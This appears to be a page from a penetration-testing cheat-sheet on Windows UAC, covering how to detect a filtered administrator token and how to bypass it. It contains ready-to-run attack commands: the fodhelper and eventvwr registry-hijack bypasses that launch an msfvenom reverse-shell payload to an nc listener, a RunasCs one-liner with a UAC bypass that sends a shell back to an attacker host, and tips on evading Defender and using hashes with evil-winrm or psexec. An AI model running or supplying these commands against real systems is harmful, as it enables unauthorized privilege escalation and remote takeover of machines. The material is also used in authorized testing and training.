# UAC: admin account, filtered token

Admin group membership ≠ elevated. A medium-integrity shell of a local administrator has a filtered token: privileges missing, writes to protected paths denied. Until you elevate, the filtered token blocks `reg save`, service edits and LSASS access.

## Check
```cmd
whoami /groups | findstr /i "Mandatory Administrators"
whoami /priv
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken
net localgroup Administrators
```

| Seen | Meaning |
| --- | --- |
| `Mandatory Label\Medium Mandatory Level` + `BUILTIN\Administrators` "Group used for deny only" | Filtered admin token → elevate |
| `Mandatory Label\High Mandatory Level` | Already elevated |
| `EnableLUA` = `0` | UAC off: no filtering |
| `ConsentPromptBehaviorAdmin` = `0` | Elevates without prompt |
| `LocalAccountTokenFilterPolicy` = `1` | Remote logon (WinRM/SMB/WMI) as local admin gets the full token |
| `LocalAccountTokenFilterPolicy` missing/`0` | Only RID-500 `Administrator` gets full rights remotely |
| `FilterAdministratorToken` = `1` | Even RID-500 is filtered remotely |

- Remote shell as a non-RID-500 local admin with the policy unset: SMB/WinRM login works but the token is filtered → elevate below, or use the RID-500 account/hash.
- Service accounts and SYSTEM are not subject to UAC.

## Elevate with a GUI prompt
You have an RDP/console session and the credentials:

```powershell
Start-Process cmd.exe -Verb RunAs
```
Accept the prompt (password if the account is a standard user). Confirm: `whoami /groups` shows High Mandatory Level.

## Elevate from a shell: fodhelper
Same user, same logon session as the shell, member of Administrators (filtered). `fodhelper.exe` auto-elevates and reads a per-user registry handler.

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\rev.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\fodhelper.exe
```
Listener first (`nc -lvnp 443`); `rev.exe` from [msfvenom](../foothold/shells.md#msfvenom-payloads). New shell: `whoami /groups` → High Mandatory Level.

Clean up:
```cmd
reg delete HKCU\Software\Classes\ms-settings /f
```
- Same pattern, other auto-elevating binaries: `computerdefaults.exe` (same `ms-settings` key), `eventvwr.exe` (`HKCU\Software\Classes\mscfile\shell\open\command`).
- Works only if the setting "Always notify" is off (default prompt level). Always-notify or a non-admin account → no auto-elevation.
- Run from an interactive-context shell. A shell started by a service (IIS, SQL) belongs to a service account: no UAC, but go to [potato](potato.md).
- Defender may flag the handler change or the payload → [execution and defenses](execution-and-defenses.md).

## Elevate with credentials
```powershell
.\RunasCs.exe <USER> <PW> cmd.exe --bypass-uac -r <KALI>:443
```
- Only for a local admin with a filtered token → [credentials](credentials.md#run-as-another-user-have-creds).
- RID-500 `Administrator` password/hash: log in remotely (`evil-winrm`, `impacket-psexec`) for a full-rights session without UAC.

## After elevation
Rerun [first pass](enumeration.md): `whoami /priv` now shows the privileges → [token rights](token-groups.md), [credential access](credential-access.md).
